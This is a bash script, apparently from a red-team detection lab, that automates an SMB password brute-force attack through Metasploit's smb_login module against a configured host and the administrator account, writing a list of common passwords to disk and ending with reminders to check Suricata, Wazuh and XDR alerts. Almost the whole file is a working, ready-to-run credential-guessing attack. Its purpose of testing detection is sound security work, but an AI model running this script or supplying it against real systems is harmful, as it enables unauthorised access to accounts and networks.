#!/bin/bash
# ============================================================================
# SMB Bruteforce Attack Script
# ============================================================================
# This script performs SMB login bruteforce attack using Metasploit
# auxiliary/scanner/smb/smb_login module
#
# MITRE ATT&CK: T1110.001 - Brute Force: Password Guessing
#               T1021.002 - Remote Services: SMB/Windows Admin Shares
#
# Usage: ./smb_bruteforce.sh
# ============================================================================

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Load config from same directory or use defaults
SCRIPT_DIR="$(dirname "$0")"
CONFIG_FILE="$SCRIPT_DIR/config.json"

if [ -f "$CONFIG_FILE" ] && command -v jq &> /dev/null; then
    TARGET_HOST=$(jq -r '.target.host' "$CONFIG_FILE")
    TARGET_USER=$(jq -r '.target.username' "$CONFIG_FILE")
    PASS_FILE=$(jq -r '.attack.password_file' "$CONFIG_FILE")
    THREADS=$(jq -r '.attack.threads' "$CONFIG_FILE")
    STOP_ON_SUCCESS=$(jq -r '.attack.stop_on_success' "$CONFIG_FILE")
else
    # Default values if config not found
    TARGET_HOST="192.168.85.115"
    TARGET_USER="administrator"
    PASS_FILE="/home/kali/demo-pass.txt"
    THREADS="4"
    STOP_ON_SUCCESS="false"
fi

# Banner
echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║           SMB Bruteforce Attack - CyberFortress RedOps            ║${NC}"
echo -e "${CYAN}║           MITRE ATT&CK: T1110.001, T1021.002                       ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if Metasploit is installed
if ! command -v msfconsole &> /dev/null; then
    echo -e "${RED}[!] Error: Metasploit Framework is not installed${NC}"
    echo -e "${YELLOW}[*] Please install Metasploit: sudo apt install metasploit-framework${NC}"
    exit 1
fi

# Check if password file exists
if [ ! -f "$PASS_FILE" ]; then
    echo -e "${RED}[!] Error: Password file not found: $PASS_FILE${NC}"
    echo -e "${YELLOW}[*] Creating demo password file...${NC}"
    
    # Create demo password file
    cat > "$PASS_FILE" << 'EOF'
password
123456
administrator
admin123
Password1
Welcome1
P@ssw0rd
Summer2025
Winter2025
letmein
qwerty
12345678
Passw0rd!
Admin@123
administrator123
Password123
Administrator
EOF
    echo -e "${GREEN}[+] Created demo password file: $PASS_FILE${NC}"
fi

echo -e "${YELLOW}[*] Attack Configuration:${NC}"
echo -e "    Target Host   : ${CYAN}$TARGET_HOST${NC}"
echo -e "    Target User   : ${CYAN}$TARGET_USER${NC}"
echo -e "    Password File : ${CYAN}$PASS_FILE${NC}"
echo -e "    Threads       : ${CYAN}$THREADS${NC}"
echo -e "    Stop on Success: ${CYAN}$STOP_ON_SUCCESS${NC}"
echo ""

# Create Metasploit resource file
RC_FILE="/tmp/smb_bruteforce_$$.rc"

cat > "$RC_FILE" << EOF
use auxiliary/scanner/smb/smb_login
set RHOSTS $TARGET_HOST
set SMBUser $TARGET_USER
set PASS_FILE $PASS_FILE
set THREADS $THREADS
set STOP_ON_SUCCESS $STOP_ON_SUCCESS
run
exit
EOF

echo -e "${GREEN}[+] Generated Metasploit resource file${NC}"
echo -e "${YELLOW}[*] Starting SMB Bruteforce Attack...${NC}"
echo ""

# Run Metasploit with the resource file
msfconsole -q -r "$RC_FILE"

# Cleanup
rm -f "$RC_FILE"

echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║           SMB Bruteforce Attack Completed                         ║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Post-attack message
echo -e "${YELLOW}[*] Post-Attack Actions:${NC}"
echo -e "    1. Check Suricata alerts for SID 9004001-9004010"
echo -e "    2. Review Wazuh dashboard for Windows Event ID 4625 (Failed Logon)"
echo -e "    3. Verify SmartXDR response actions"
echo ""

exit 0
